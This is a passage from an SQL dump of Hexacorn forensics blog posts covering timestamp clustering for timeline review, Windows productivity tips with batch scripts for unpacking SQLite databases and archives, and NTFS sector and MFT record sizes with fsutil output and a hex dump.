a normalized timestamp (normalized to minutes i.e. 60 seconds), then actual timestamp, then path.\nClustering is a very interesting technique, yet it would seem not widely used. Applied on top of a timeline it could help reduce the amount of data for manual review and most importantly – may immediately highlight suspicious artifacts based on specific criteria. As I mentioned earlier, in the example above I decide to remove from the view all these entries that form the clusters of 10 or more files. This is arbitrary, but doesn’t have to be. It would be certainly helpful in finding malware, as malware rarely drops more than 10 files on the system, yet it would not helpful finding stashed content that has been copied in bulk. A lot more research is needed to find out how to utilize this technique widely and perhaps generate scenarios that can be converted into usable ‘dynamic smart filters’ that can be applied on top of any data.\nThe following things may be taken into consideration:\n\nvarious artifacts (on top of timeline across the whole system)\nvarious timestamps (one can run cluster analysis for all creation, modification, access, entry creation times)\nvarious criteria can be used – across file system, or just directory, or directory and subdirectories\nless utilized timestamps e.g. timestamps extracted from Portable Executables – these that stand out need to be looked at (standard system binaries are usually precompiled with a specific timestamp or their range)\nnot only timestamps and timelines can be used; e.g. image base of Portable Executables is also a good candidate for finding executables that stand out\n\nThe data can be manipulated and analyzed in many ways and ideally there should be an easy way to play with clustering parameters – I am not aware of any interactive tool that could do that in a generic way, but even simple toying around with Excel or a simple script can help here. If you know any free software that already does it, I would appreciate if you let me know.\nLast, but not least, before even clustering is applied, one can remove entries using known techniques e.g. clean file hashes, known clean full paths, as well as data obtained from installer analysis extracted from case (run, collect data about file paths, apply as a whitelist), and other data that has a low chance for being interesting (e.g. directories outside of typical scope of system/user activity).\nIf you want to toy around with the idea, you can download Cluester – an example script that I used for this post.\nIt can be downloaded from  here.\nIt works on data obtained from running fls on NTFS system:\n    fls -lrm <drive> -i <type> -f <type> \\\\.\\<drive> > <output>\r\n\r\ne.g.\n    fls -lrm f: -i raw -f ntfs \\\\.\\f:  > list\nUpdate: 2012-05-28\nFixed typos, grammar mistakes, polished it a bit (that’s what happens when you write posts at 2am ;).\nShare this :)', 'Cluester, Forensic Analysis, Software Releases, Tips & Tricks', 'http://www.hexacorn.com/blog/2012/05/27/cluester-clustering-as-a-data-reduction-technique/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (369, 'Permanent Link to Speeding up case processing, part 2', 'Hexacorn', 'May 21, 2012 ', 'In my older post I talked about various things one can do to speed up case processing – this post is a quick follow up with some more hints; again, it is very Windows-centric.\nLet’s start with simple things:\n\nUse multiple computers with one keyboard and mouse – use Synergy to control them\nUse multiple monitors\nUse VNC to peep at the guest system if you use VMware – it’s often faster\nUse VirtualKD to work faster with windbg/vmware\nRename tools – change long names to shorter e.g.\n\n\n\ngrep -> g\nstrings -> s\nhexview ->h\nand so on and so forth\n\nIf you do the same task more than once, write quick and dirty batch files, scripts (bat, cmd, vbs, vba, powershell, autoit, etc.) and keep them all in a repository so you can always leverage the snippets; you don’t need to build libraries, simple copy&paste is often good enough\n\n\nexample: if you often unpack SQLITE databases, avoid dumping the databases manually; write a batch file e.g. u_sql.bat and put there sth along the lines\n\nmd unpacked\r\nfor %%k in (*.*) do echo .dump|sqlite3 \"%%k\" > \"unpacked\\%%k.txt\"\r\n\r\nwhen ran, it will dump the databases into text files that can be easily grepped\n\nanother example: if you often unpack archives, avoid clicking the GUI; write a batch file e.g. u_arc.bat and put there sth along the lines\n\nmd unpacked\r\nfor %%k in (*.*) do \"c:\\program files\\winrar\\winrar.exe\" -IBCK x -r -y \"%%k\" \"unpacked\\%%k\\\"\r\n\r\nwhen ran, it will unpack all archives into unpacked\\archive_name\n\nRecord macros and replay them (for mundane tasks – eg. if you need to fill in some stupid forms multiple times)\nLearn to efficiently use Excel, in particular:\n\nkeyboard shortcuts (go ahead, and try: CTRL+`, CTRL+1, CTRL+;, CTRL+SHIFT+8, CTRL+PAGE DOWN, CTRL+PAGEUP, and then go to Excel help and read about all shortcuts)\nPivot tables (great for histograms and quick statistics)\nExcel formulas e.g. VLOOKUP, HLOOKUP, CHAR, LEFT, FIND, etc.\nUseful functions like Copy Formulas, Copy with Transposition, Copy Values only\nSorting and Advanced filtering\n\nThe same applies to Word\n\nLearn about styles and stylesheets\nAvoid changing default settings\nDisable irritating functions\n\nAvoid lower-quality software\n\nYou will lose time fighting with random crashes, badly designed UI, and lots of imperfections that steal your time; good (bad) example is OpenOffice – it is good for simple editing tasks, but it does not solve problems that MS Office solved many years ago and productivity-wise is way behind\n\nAvoid tools that are NOT ready to be used immediately after downloading\n\nThe rule of a thumb is that you want to use the tool, not waste your time compiling/fixing bugs, etc.\nIf you are into research it’s of course fine, but if you want to do your work faster – AVOID wasting time on it; if it doesn’t compile, don’t try to build it and fix bugs\n\nSet up environment to include paths to all your tools; if you run a tool and Windows Explorer pops up instead, you are doing it wrong  and your PATH should be fixed\nUse PATHEXT to run scripts directly from command line w/o specifying the interpreter\nUse Registry tweaks to disable animations, and other fancy stuff\nAutostart all the tools/services you frequently use and kill all the tools you don’t use (be brutal with services.msc or autoruns)\nUse Registry tweaks to have a decent context menu that you use to quickly run some tool over the analyzed file e.g.:\n\nHKEY_CLASSES_ROOT\\*\n\n\nas seen in the Regedit:\n\n\n\nHKEY_CLASSES_ROOT\\exefile\n\n\nas seen in the context menu\n\nThat’s all for today.\nShare this :)', 'Forensic Analysis, Preaching', 'http://www.hexacorn.com/blog/2012/05/21/speeding-up-case-processing-part-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (370, 'Permanent Link to Sector size and MFT FILE Record size', 'Hexacorn', 'May 4, 2012 ', 'This is a quick post to clarify a very common misconception about sizes of a sector and a single MFT FILE record on NTFS file system.\nThe most common values associated with these 2 parameters are:\n\n512 bytes – for a sector\n1024 bytes – for a single MFT FILE record\n\nIt turns out that new large drives are often seen by OS as having a sector size that is larger than 512 bytes and as a result, the MFT FILE record size is often also larger. This is not a big issue and many forensic tools handle it properly, but seeing many people explicite calling out these ‘hard wired’ values, I thought I will make an attempt to clarify it a bit.\nA side effect of this is that $MFT size may quickly grow to many GiBs.\nI do not work with hardcore file carving on daily basis, so I am pretty sure that someone who does could (and I hope will) offer a more in-depth explanation of what’s going on under the hood (e.g. whether the 4096 is a virtual sector made out of 8 ‘old-school’ physical sectors that are 512 bytes, etc.).\nOn a practical level, one can confirm the size of the sector and cluster as well as MFT FILE record size using e.g. fsutil tool in Windows.\nFor a drive with a 512-bytes long sector, you may get a result like this:\nfsutil fsinfo ntfsinfo c:\n[...]\nBytes Per Sector  :               512  <- sector size\r\nBytes Per Cluster :               4096 <- cluster size = 8 sectors\r\nBytes Per FileRecord Segment    : 1024 <- MFT FILE Record size = 2 sectors\n[...]\nFor a drive with 4096 bytes long sectors, the fsutil can give the following result:\nfsutil fsinfo ntfsinfo g:\n[...]\nBytes Per Sector  :               4096 <- sector size\r\nBytes Per Cluster :               4096 <- cluster size = 1 sector\r\nBytes Per FileRecord Segment    : 4096 <- MFT FILE Record size \r\n                                          = 1 sector = 1 cluster\n[...]\n \nThe values for a logical volume can be read from BPB (BIOS Parameter Block)  – a decent explanation on encoding used to preserve the value of FILE record size can be found here.\nThis is an example of a FILE record on such a large drive:\n000000000 46 49 4C 45 30 00 09 00 27 25 00 02 00 00 00 00 FILE0...\'%......\r\n000000010 01 00 01 00 48 00 01 00 68 01 00 00 00 10 00 00 ....H...h.......\r\n000000020 00 00 00 00 00 00 00 00 04 00 00 00 01 00 00 00 ................\r\n000000030 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000040 00 00 00 00 00 00 00 00 10 00 00 00 60 00 00 00 ............`...\r\n000000050 00 00 18 00 00 00 00 00 48 00 00 00 18 00 00 00 ........H.......\r\n000000060 B9 78 C5 A0 47 51 CB 01 B9 78 C5 A0 47 51 CB 01 .x..GQ...x..GQ..\r\n000000070 B9 78 C5 A0 47 51 CB 01 B9 78 C5 A0 47 51 CB 01 .x..GQ...x..GQ..\r\n000000080 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000090 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 ................\r\n0000000A0 00 00 00 00 00 00 00 00 30 00 00 00 70 00 00 00 ........0...p...\r\n0000000B0 00 00 18 00 00 00 02 00 52 00 00 00 18 00 01 00 ........R.......\r\n0000000C0 05 00 00 00 00 00 05 00 B9 78 C5 A0 47 51 CB 01 .........x..GQ..\r\n0000000D0 B9 78 C5 A0 47 51 CB 01 B9 78 C5 A0 47 51 CB 01 .x..GQ...x..GQ..\r\n0000000E0 B9 78 C5 A0 47 51 CB 01 00 40 00 00 00 00 00 00 .x..GQ...@......\r\n0000000F0 00 40 00 00 00 00 00 00 06 00 00 00 00 00 00 00 .@..............\r\n000000100 08 03 24 00 4D 00 46 00 54 00 4D 00 69 00 72 00 ..$.M.F.T.M.i.r.\r\n000000110 72 00 00 00 00 00 00 00 80 00 00 00 48 00 00 00 r...........H...\r\n000000120 01 00 40 00 00 00 01 00 00 00 00 00 00 00 00 00 ..@.............\r\n000000130 03 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@.......\r\n000000140 00 40 00 00 00 00 00 00 00 40 00 00 00 00 00 00 .@.......@......\r\n000000150 00 40 00 00 00 00 00 00 11 04 02 00 00 00 00 00 .@..............\r\n000000160 FF FF FF FF 00 00 00 00 20 00 00 00 20 02 00 00 ........ ... ...\r\n000000170 01 02 00 00 00 00 00 05 20 00 00 00 20 02 00 00 ........ ... ...\r\n000000180 80 00 00 00 48 00 00 00 01 00 40 00 00 00 01 00 ....H.....@.....\r\n000000190 00 00 00 00 00 00 00 00 03 00 00 00 00 00 00 00 ................\r\n0000001A0 40 00 00 00 00 00 00 00 00 40 00 00 00 00 00 00 @........@......\r\n0000001B0 00 40 00 00 00 00 00 00 00 40 00 00 00 00 00 00 .@.......@......\r\n0000001C0 11 04 02 00 00 00 00 00 FF FF FF FF 00 00 00 00 ................\r\n0000001D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000001E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000001F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 00 ................\r\n000000200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000002A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000002B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000002C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000002D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000002E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000002F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000300 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000310 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000320 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000330 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000340 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000350 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000360 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000370 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000003A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000003B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000003C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000003D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000003E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000003F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 00 ................\r\n000000400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000004A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000004B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000004C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000004D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000004E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000004F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000500 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000510 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000520 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000530 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000540 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000550 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000560 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000570 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000580 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000590 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000005A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000005B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000005C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000005D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000005E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000005F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 00 ................\r\n000000600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000610 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000620 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000630 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000640 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000650 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000660 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000670 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000680 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000690 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000006A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000006B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000006C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000006D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000006E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000006F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000700 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000710 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000720 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000730 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000740 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000750 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000760 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000770 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000780 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000790 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000007A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000007B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000007C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000007D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000007E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000007F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 00 ................\r\n000000800 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000810 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000820 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000830 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000840 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000850 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000860 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000870 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000880 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000890 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000008A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000008B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000008C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000008D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000008E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000008F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000900 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000910 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000920 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000930 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000940 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000980 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000990 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000009A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000009B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000009C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000009D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000009E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000009F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 00 ................\r\n000000A00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000A10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000A20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000A30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000A40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000A50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000A60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000A70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000A80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000A90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000AA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000AB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000AC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000AD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000AE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000AF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000B00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000B10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000B20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000B30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000B40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000B50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000B60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000B70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000B80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000B90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000BA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000BB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000BC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000BD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000BE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000BF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 00 ................\r\n000000C00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000C10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000C20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000C30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000C40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000C50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000C60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000C70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000C80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000C90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000CA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000CB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000CC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000CD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000CE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000CF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000D00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000D10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000D20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000D30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000D40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000D50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000D60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000D70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000D80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000D90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000DA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000DB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000DC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000DD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000DE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000DF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 00 ................\r\n000000E00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000E10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000E20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000E30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000E40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000E50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000E60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000E70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000E80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000E90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000EA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000EB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000EC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000ED0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000EE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000EF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000F00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000F10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000F20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000F30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000F40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000F50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000F60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000F70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000F80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000F90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000FA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000FB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000FC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000FD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000FE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n000000FF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 00 ................\nShare this :)', 'Forensic Analysis', 'http://www.hexacorn.com/blog/2012/05/04/sector-size-and-mft-file-record-size/\n');
